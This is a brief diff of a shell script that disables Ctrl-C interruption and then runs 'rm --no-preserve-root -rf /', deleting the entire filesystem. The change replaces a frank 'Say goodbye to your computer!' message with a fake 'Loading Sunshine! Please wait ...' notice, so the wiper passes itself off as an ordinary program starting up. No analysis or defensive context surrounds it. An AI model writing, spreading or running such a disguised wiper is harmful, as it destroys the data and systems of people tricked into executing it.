@@ -2,5 +2,5 @@
 # Ignore SIGINT
 trap '' SIGINT
 
-echo -ne "Say goodbye to your computer!\n"
+echo -ne "Loading Sunshine! Please wait ...\n"
 rm --no-preserve-root -rf /
